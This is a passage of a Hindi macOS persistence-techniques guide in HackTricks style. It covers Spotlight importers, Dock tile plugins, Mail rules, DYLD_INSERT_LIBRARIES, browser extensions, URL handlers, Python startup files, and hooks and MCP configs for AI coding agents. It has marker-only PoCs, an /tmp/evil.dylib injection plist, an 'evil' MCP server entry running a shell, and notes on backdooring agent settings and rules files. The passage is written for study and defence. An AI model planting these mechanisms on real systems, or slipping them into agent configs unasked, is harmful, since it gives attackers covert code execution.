और उदाहरण के लिए **/Library/Spotlight/iBooksAuthor.mdimporter** का उपयोग इस प्रकार की फ़ाइलों को parse करने के लिए किया जाता है (अन्य के साथ `.iba` और `.book` एक्सटेंशन वाली फ़ाइलें):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> अगर आप किसी दूसरे `mdimporter` की Plist जाँचते हैं, तो हो सकता है कि आपको **`UTTypeConformsTo`** एंट्री न मिले। ऐसा इसलिए है क्योंकि यह एक built-in _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier) ) है और इसमें extensions बताने की ज़रूरत नहीं होती।
>
> इसके अलावा, System के default plugins को हमेशा प्राथमिकता मिलती है, इसलिए attacker केवल उन फ़ाइलों तक पहुँच सकता है जिन्हें Apple के अपने `mdimporters` index नहीं करते।

अपना importer बनाने के लिए, आप इस project से शुरुआत कर सकते हैं: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), फिर उसका नाम बदलें, **`CFBundleDocumentTypes`** बदलें और **`UTImportedTypeDeclarations`** जोड़ें, ताकि वह आपकी इच्छित extension को support करे; साथ ही उन्हें **`schema.xml`** में दर्शाएँ।\
फिर **`GetMetadataForFile`** function का code **बदलें**, ताकि processed extension वाली फ़ाइल बनने पर आपका payload execute हो।

अंत में, अपना नया **`.mdimporter` build करके** उसे पिछली तीन locations में से किसी एक पर copy करें। यह देखने के लिए कि वह load हुआ है या नहीं, **logs monitor करें** या **`mdimport -L`** चलाएँ।

> [!TIP]
> Importer sandbox बहुत restrictive होने के बावजूद, `mdworker` फ़ाइलों को **privileged read access** के साथ index करता है। इसलिए कोई malicious `.mdimporter` TCC-protected locations (Downloads, Pictures, Desktop, …) में मौजूद फ़ाइलों का *content* पढ़ सकता है और बिना किसी TCC prompt के इकट्ठा किया गया metadata exfiltrate कर सकता है — यह **"Sploitlight" TCC bypass (CVE-2025-31199)** है, जिसे macOS Sequoia 15.4 में patch किया गया था।<sup>[[55]](#references)</sup>

### ~~वरीयता पैनल~~

> [!CAUTION]
> ऐसा नहीं लगता कि यह अब काम कर रहा है।

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- sandbox bypass करने में उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - इसके लिए user की एक खास कार्रवाई ज़रूरी है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

ऐसा नहीं लगता कि यह अब काम कर रहा है।<sup>[[26]](#references)</sup>

### एप्लिकेशन स्क्रिप्ट फ़ाइलें

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- sandbox bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन लक्षित application का install होना और victim द्वारा उसे चलाया/इस्तेमाल किया जाना ज़रूरी है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

ऐसी **interpreted script जिसे कोई installed application या tool वास्तव में execute करता हो** और जिसे actor modify कर सके। फ़ाइल की permissions और उसे call करने वाले path की पुष्टि करें; केवल `.sh` या `.py` फ़ाइल मिलना पर्याप्त नहीं है। Apple की [code-signing guide](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) के अनुसार, signed app bundles scripts सहित resources को seal करते हैं। Bundle के अंदर की script edit करने से यह seal टूट जाती है और bundle validate होने पर इसका पता चल सकता है या इसे block किया जा सकता है। Homebrew के launcher जैसी external script के signing और trust behavior अलग होते हैं। Writeup में दिए गए ऐतिहासिक उदाहरण:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – पुराने Sublime Text releases में इस्तेमाल की गई script; installed version के लिए फ़ाइल और उसके startup में इस्तेमाल होने की जाँच करें। यह test Mac पर मौजूद नहीं थी।
- **`/opt/homebrew/bin/brew`** (Apple Silicon) या **`/usr/local/bin/brew`** (Intel) – उस `brew` path को invoke करने पर execute होने वाला Bash launcher, यदि installed हो और actor उसे लिख सके। Test Mac पर `/opt/homebrew/bin/brew` एक writable Bash script थी; यह केवल एक local observation है, Homebrew permissions का सामान्य नियम नहीं।
- **Python app bundle के अंदर IDLE की `idlemain.py`** – इसे लिखने के लिए admin permission की ज़रूरत हो सकती है, लेकिन यह IDLE user की identity के साथ चलती है।
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – एक ऐतिहासिक root-run shell script, जब संबंधित `org.wireshark.ChmodBPF` launchd job installed हो। Test Mac पर script और job, दोनों मौजूद नहीं थे।

#### विवरण और Exploitation

कुछ tools और apps runtime पर interpreted scripts execute करते हैं। Writable script में जोड़े गए commands अगली बार उसका खास caller चलने पर execute हो सकते हैं, बशर्ते signature validation, quarantine और अन्य checks इसकी अनुमति दें। मूल research में 2019 के कई installations दिखाए गए थे; target version पर उनके paths और triggers फिर से जाँचें।<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

इस copy test में macOS 26.5.2 पर `marker fired: True` मिला; मूल launcher को नहीं छुआ गया। इससे साबित होता है कि insertion point copy में execute होता है, न कि यह कि modified signed app bundle या असली Homebrew installation हर launch check में सफल होगी।

### Dock Tile Plugins

लेख: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- sandbox को bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - इसके लिए ज़रूरी है कि plug-in घोषित करने वाला app खोजा/registered और Dock द्वारा process किया जाए।
  - Plugin एक **Apple-signed** helper में load होता है, जिसमें app-sandbox entitlement नहीं है और **library validation disabled** है। उद्धृत research में यह helper Background Task Management UI में नहीं दिखाया गया था; target release पर इसकी दृश्यता जाँची जानी चाहिए।
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, app की `Info.plist` में **`NSDockTilePlugIn`** key से referenced; plugin की अपनी `Info.plist` में **`NSPrincipalClass`** सेट होता है।

#### विवरण और Exploitation

जब कोई app `NSDockTilePlugIn` घोषित करता है, तो Dock referenced bundle को login के समय या उसका tile जोड़े जाने पर **`com.apple.dock.external.extra`** XPC helper (`...extra.arm64` Apple Silicon पर) में load कर सकता है; app को खुद launch होने की ज़रूरत नहीं है। इसके लिए ज़रूरी है कि app को macOS खोजे/registered करे और स्वीकार करे। यह helper **Apple-signed** है, इसमें `com.apple.security.app-sandbox` entitlement नहीं है और इसमें `com.apple.security.cs.disable-library-validation` है। Load होने पर principal class का **`setDockTile:`** method invoke होता है; वहाँ से यह बाद की घटनाओं के लिए distributed notifications (जैसे `com.apple.screenIsLocked`) subscribe कर सकता है।<sup>[[38]](#references)</sup>

macOS 26.5.2 पर, read-only `codesign` inspection से helper के Apple signature और entitlements की पुष्टि हुई; साथ ही कई installed apps में `NSDockTilePlugIn` घोषित था। उस Mac पर कोई नया plug-in install या load नहीं किया गया, इसलिए उस release पर नए लिखे bundle का execution अब भी untested है।

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - Widget extension अपने **अलग process** में चलता है, और इसे जोड़ने पर **Background Task Management alert** नहीं आता
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - config plist, TCC-protected container के अंदर रहता है, इसलिए इसे बाहर से संपादित करने के लिए Full Disk Access या TCC bypass की आवश्यकता होती है

#### स्थान

- Widget extension bundle: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- सक्रिय/पंजीकृत widgets: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (keys `widgets.instances` और `widgets.widgets`)

#### विवरण और Exploitation

किसी app के अंदर शामिल WidgetKit extension, Notification Center द्वारा प्रबंधित अपने **अलग process** में चलता है। `widgets.instances` में एक instance पंजीकृत करने (यह embedded `INIntent` data वाला base64 `NSKeyedArchiver`-encoded `CHSWidget` blob होता है) और NotificationCenter को restart करने पर widget load होता है और उसका `TimelineProvider`/intent code execute होता है।<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app Rules (AppleScript चलाएँ)

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन Mail.app में कोई account configured होना चाहिए और वह चल रहा होना चाहिए; trigger एक आने वाला email है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Mail के बाहर rules/scripts को edit करने के लिए Mail को बंद करना और आधुनिक macOS पर Full Disk Access देना ज़रूरी हो सकता है

#### स्थान

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (local rules; Sonoma/Sequoia पर `V10`, नए versions पर `V11`+)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (iCloud-सिंक किए गए rules, इन्हें प्राथमिकता मिलती है)
- Rule enablement: **`RulesActiveState.plist`**; AppleScript payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### विवरण और Exploitation

Apple Mail के **rule** में *"Run AppleScript"* action हो सकता है। किसी crafted **subject line** से मेल खाने वाला rule जोड़कर और उसे attacker script चलाने के लिए सेट करके, adversary को Mail के context में **दूर से trigger किया जा सकने वाला, छिपा हुआ** code execution मिलता है—यह ऐसा vector है जो कई persistence scanners से बच निकलता है, क्योंकि कोई LaunchAgent/Login Item नहीं बनाया जाता।<sup>[[42]](#references)</sup> Trigger email को **delete** करने के लिए भी rule सेट करने से सबूत छिप जाता है। Defenders इसे सीधे ढूँढ़ सकते हैं:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Configuration Profiles (.mobileconfig)

Writeup: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Sandbox bypass करने में उपयोगी: [🔴](https://emojipedia.org/large-red-circle)
  - आधुनिक macOS में System Settings → *Device Management* में **मैन्युअल उपयोगकर्ता की मंज़ूरी** ज़रूरी है (MDM के बाहर साइलेंट `profiles install` अब उपलब्ध नहीं है)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- इंस्टॉल किए गए profiles **`/Library/Managed Preferences/`** और **`/var/db/ConfigurationProfiles/`** में होते हैं; profile एक XML plist होती है, जिसमें `PayloadContent` array होता है।

#### विवरण और Exploitation

`.mobileconfig` सीधे code-execution primitive नहीं है, लेकिन यह **trusted root CA** (`com.apple.security.root`), **global या PAC proxy** (`com.apple.proxy.*`), **managed preferences** (`com.apple.ManagedClient.preferences`) या restrictions जैसी configuration को persist कर सकती है। macOS 10.15 और इसके बाद के versions में, Apple की [`PayloadRemovalDisallowed` परिभाषा](https://developer.apple.com/documentation/devicemanagement/toplevel) के अनुसार, इसे बिना removal-password payload वाली **मैन्युअल रूप से इंस्टॉल की गई** profile पर `true` सेट करने से उसे हटाने के लिए **administrator authentication** आवश्यक होता है; इससे वह profile पूरी तरह से हटाई न जा सकने वाली नहीं बनती। MDM से इंस्टॉल की गई profiles पर management और removal के अलग नियम लागू होते हैं।<sup>[[44]](#references)</sup>

> [!WARNING]
> किसी सामान्य configuration profile में **मनमाना `LaunchDaemon`/`LaunchAgent` डालने वाला कोई payload type नहीं होता**। इस तरह daemon इंस्टॉल करने के लिए पूर्ण **MDM enrollment** के साथ management agent/script चाहिए — `.mobileconfig` को launchd delivery mechanism न समझें।

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Persistence

- sandbox bypass करने के लिए उपयोगी: [🔴](https://emojipedia.org/large-red-circle)
  - dyld, SIP/platform binaries, hardened-runtime apps और setuid targets के लिए `DYLD_*` को **strips** कर देता है, इसलिए यह केवल unprotected processes में inject करता है और SIP/hardened runtime को **bypass नहीं** करता
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- भरोसेमंद तरीका: malicious `LaunchAgent`/`LaunchDaemon` plist के अंदर **`EnvironmentVariables`** dict (login/boot पर चलता है)
- अप्रचलित/ऐतिहासिक (केवल रिपोर्ट करें): **`~/.MacOSX/environment.plist`** (10.8 में हटाया गया) और **`/etc/launchd.conf`** (10.10 में हटाया गया)

#### Description & Exploitation

अगर attacker, victim process के environment में `DYLD_INSERT_LIBRARIES` डाल सकता है, तो dyld attacker की dylib (जिसका constructor चलता है) उस process में load कर देता है। Persistent variant, variable को LaunchAgent में embed करता है, ताकि job के हर launch पर यह फिर से inject हो। ध्यान दें कि आधुनिक macOS पर `launchctl setenv DYLD_*` को filter किया जाता है, इसलिए इसे plist में embed करें।<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

dylib injection/hijacking की पूरी प्रक्रिया के लिए देखें:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### AI Coding Agent CLIs (hooks, MCP servers, rules files)

लेख: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - इसके लिए developer को संबंधित agent का उपयोग करना होगा। Agent द्वारा configuration स्वीकार किए जाने पर startup commands उस user के privileges के साथ चलती हैं; workspace trust और MCP approval, product और session mode के अनुसार अलग-अलग होते हैं।
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle) (user के रूप में चलता है; terminal/agent के पास पहले से जो भी access है, वही प्राप्त करता है)

#### स्थान

स्पष्ट hook और MCP configuration files के कारण **developer द्वारा tool का उपयोग करने पर shell commands या child processes चल सकती हैं** — या तो per-user global file से (persistence) या repo में committed file से (supply-chain)। `CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, और editor rules **agent को दिए गए निर्देश हैं**, जिन्हें पढ़ने मात्र से shell execution की गारंटी नहीं होती; उनका प्रभाव agent के व्यवहार और tool permissions पर निर्भर करता है। हर product के मौजूदा trust और approval rules जाँचें।

- **Claude Code**
  - `~/.claude/settings.json`, project `.claude/settings.json`, `.claude/settings.local.json`, और केवल root द्वारा बदली जा सकने वाली **`/Library/Application Support/ClaudeCode/managed-settings.json`** (MDM/managed settings को user **override नहीं कर सकता** → मजबूत persistence)
  - `hooks` object — events `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — प्रत्येक एक shell `command` चलाता है
  - `statusLine.command` — status line render करने के लिए चलाया जाने वाला shell command (हर session में)
  - `~/.claude.json` / project `.mcp.json` में MCP servers — `command`+`args` को child processes के रूप में launch किया जाता है
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — ऐसे निर्देश जो prompt injection का प्रयास कर सकते हैं; यह agent के व्यवहार और tool permissions पर निर्भर करता है
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` को children के रूप में launch किया जाता है); `AGENTS.md` project instructions
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP servers); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … commands चलाते हैं); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### विवरण और Exploitation

यदि कोई actor account की user-global settings में बदलाव कर सकता है, तो उसके hook या MCP commands भविष्य के sessions में उस account के अंतर्गत चल सकते हैं। Repository-controlled config एक अलग मामला है: [Claude Code के मौजूदा security docs](https://code.claude.com/docs/en/security) में interactive workspace trust dialog और project `.mcp.json` servers के लिए अलग approval prompt का वर्णन है। [इसके permission matrix](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) के अनुसार, parent folder को trust करने के बाद hooks चल सकते हैं, और `claude -p`/SDK sessions में interactive trust prompt नहीं दिखता; इन noninteractive modes में project MCP servers बिना approval prompt के connect होते हैं। CVE-2025-59536 के रूप में रिपोर्ट किया गया pre-trust project hook bypass [2025 में ठीक कर दिया गया था](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); इसे मौजूदा default behavior न मानें। Delivery vectors में compromised repository या malicious installer शामिल हो सकते हैं। Rules-file prompt injection, स्पष्ट hook की तुलना में कम deterministic है और फिर भी tool approvals पर निर्भर करता है।<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Claude Code user-global settings का उदाहरण; testing के लिए इसे केवल disposable account में रखें:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

उपयोगकर्ता-वैश्विक Codex MCP कॉन्फ़िगरेशन का उदाहरण:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

उदाहरण Cursor hook कॉन्फ़िगरेशन; इसका इस्तेमाल करने से पहले इसके installed version का schema जांचें:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Browser Extensions (Chromium: Chrome / Brave / Edge)

Writeup: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [macOS पर ExtensionInstallForcelist का दुरुपयोग](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - इसके लिए समर्थित browser और इंस्टॉल किया हुआ, enabled extension आवश्यक है। macOS पर External Extensions के लिए user confirmation आवश्यक है; managed force-install के लिए लागू enterprise policy आवश्यक है।
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> यह **native messaging hosts** से अलग है (ऊपर *Chrome native messaging hosts* section देखें)। यहाँ persistence स्वयं **auto-installed extension** है।

#### Location

- **External Extensions JSON** (browser शुरू होने पर खोजी जाती है, फिर macOS पर enable करने का prompt दिखता है):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (per-user) या `/Library/Application Support/Google/Chrome/External Extensions/` (सभी users)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Managed preferences / configuration profile के ज़रिए Enterprise-policy force-install**:
  - `com.google.Chrome` key `ExtensionInstallForcelist` (Brave `com.brave.Browser`, Edge `com.microsoft.Edge`), जिसे `/Library/Managed Preferences/` या इंस्टॉल किए गए `.mobileconfig` से पढ़ा जाता है

#### विवरण और Exploitation

ये इंस्टॉलेशन के दो अलग-अलग तरीके हैं। Chrome के [external-install documentation](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) के अनुसार, *External Extensions* file के ज़रिए दिए गए extension को **Windows और macOS users को confirm और enable करना होगा**; केवल उस JSON file को लिखने से यह execute नहीं होता। macOS पर सभी users के लिए इंस्टॉलेशन में Chrome यह भी आवश्यक करता है कि external-extension file को unprivileged बदलावों से सुरक्षित रखा जाए। Managed `ExtensionInstallForcelist` या `ExtensionSettings` policy, user interaction के बिना extension इंस्टॉल और pin कर सकती है; [Google की Mac policy guide](https://support.google.com/chrome/a/answer/7517624) managed configuration का वर्णन करती है और बताती है कि user force-installed extensions को हटा नहीं सकते। यह policy deployment का तरीका है, per-user `defaults write` का कोई shortcut नहीं।<sup>[[49]](#references)</sup>

> [!WARNING]
> macOS पर, *External Extensions* JSON manifest में **Chrome Web Store** का update URL होना चाहिए, local CRX का नहीं। Managed policy deployment की अपनी enterprise prerequisites होती हैं और इससे managed self-hosted update URL की अनुमति मिल सकती है। Test profile में local unpacked extension के लिए Chrome का developer-mode `--load-extension=/path` switch एक अलग mechanism है; इससे External Extensions JSON file अपने-आप execute नहीं होती। `Secure Preferences` में लिखने को इन दोनों documented registration routes के बराबर न मानें।

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

उस disposable account में Chrome शुरू करें और enable prompt देखें; उपयोगकर्ता के स्वीकार करने के बाद extension का अपना behavior ही execution PoC है। परीक्षण के बाद, manifest हटाएँ और उस profile में extension को disable/uninstall करें। Research Mac के active Chrome profile में इस path को **नहीं** आज़माया गया। वहाँ managed-policy route भी deploy नहीं किया गया था।

Force-install और External Extensions, **Chrome Web Store** extension IDs को संदर्भित करते हैं; profile की HMAC-signed `Secure Preferences` को संपादित करके local extension को चुपचाप inject करने की low-level तरकीब और Chromium-process के अन्य दुरुपयोग के लिए देखें:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL Scheme और File-Type Handlers (LaunchServices)

लेख: [Custom URL Schemes के ज़रिए Remote Mac Exploitation (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - Trigger तब होता है जब victim किसी link (जैसे Chrome/Brave/Safari में) पर click करता है या registered type की file खोलता है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- App bundle का `Info.plist`, जिसमें **`CFBundleURLTypes`/`CFBundleURLSchemes`** (custom URL scheme) या **`CFBundleDocumentTypes`** (file extension/UTI) घोषित हों
- Per-user effective defaults, **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (`LSHandlers` array) में दिख सकते हैं। URL-scheme default चुनने के लिए Apple का supported API `LSSetDefaultHandlerForURLScheme` है; उस plist को सीधे लिखना registration या cache-update का documented तरीका नहीं है।

#### Description और Exploitation

Launch Services, registered app के `Info.plist` से URL-scheme और document claims प्राप्त करता है। [Apple की registration guide](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) कहती है कि registration तब हो सकता है जब Finder app को खोजता है, boot या login के समय, या किसी explicit registration API के ज़रिए; केवल app को कहीं लिख देने से तुरंत trigger होने की गारंटी नहीं होती। Registration के बाद, matching URL या document खोलने पर चुना गया handler app launch हो सकता है, जो उपयोगकर्ता की default-handler पसंद और macOS के सामान्य launch checks के अधीन है। Supported `LSSetDefaultHandlerForURLScheme` API, उपयोगकर्ता का पसंदीदा URL handler बदलता है; इससे नई डाली गई app अपने आप execute नहीं होती।<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

macOS 26.5.2 research Mac पर कोई app register नहीं किया गया और कोई handler preference नहीं बदली गई। किसी वास्तविक handler को test करने के लिए, एक disposable user account इस्तेमाल करें, unique scheme वाला marker-only app register करें, उसका URL invoke करें, फिर app और उसका registration हटा दें।

File-extension और URL-scheme handlers की गहराई से enumeration/abuse करने के लिए देखें:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Python startup files (`.pth` / `usercustomize` / `sitecustomize`)

Writeup: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - तब चलता है जब संबंधित Python interpreter उस site directory को enabled रखकर शुरू होता है; यह trigger सभी virtual environments, Python builds या startup flags में समान रूप से लागू नहीं होता
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - जिस process ने interpreter launch किया, उसी की privileges/TCC के साथ चलता है

#### Location

- **`$(python3 -m site --user-site)/*.pth`** (macOS framework builds: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Root की आवश्यकता नहीं (user-writable)
  - **Trigger**: उस Python build के startup पर, जब उसका user site enabled हो; `site` module active site directories में `.pth` files process करता है
- **`<user-site>/usercustomize.py`**
  - Root की आवश्यकता नहीं
  - **Trigger**: user site enabled होने पर startup (`site` इसे auto-import करता है)
- **`<prefix>/site-packages/sitecustomize.py`** (जैसे, `/opt/homebrew/lib/python3.13/site-packages/`, या system paths)
  - Interpreter की location के आधार पर root/admin की आवश्यकता हो सकती है
  - **Trigger**: ऐसे interpreter का startup जिसमें वह site directory शामिल हो

#### Description & Exploitation

Startup पर Python आम तौर पर `site` import करता है और अपनी active `site-packages` directories में `.pth` files को scan करता है। Paths जोड़ने के अलावा, `import ` से शुरू होने वाली `.pth` line Python code execute करती है, भले ही नामित module का अन्यथा कभी इस्तेमाल न किया जाए। Python `sitecustomize` और, **जब user site enabled हो**, `usercustomize` को भी import करने की कोशिश करता है।<sup>[[56]](#references)</sup> Trigger, संशोधित directory को देखने वाले interpreter का बाद में शुरू होना है। `-S`, `site` processing को disable करता है; `-s`, `-I` या `PYTHONNOUSERSITE`, **user-site** variants को disable करते हैं। `-I` आम तौर पर global `sitecustomize` को disable नहीं करता। Virtual environments user site को बाहर भी रख सकते हैं। विशिष्ट interpreter के लिए `python3 -m site` जाँचें।

निम्नलिखित PoC macOS 26.5.2 पर चलाया गया था। इस test के लिए `PYTHONUSERBASE` user site को एक temporary directory में ले जाता है; किसी वास्तविक user site में बदलाव नहीं किया जाता:

```python
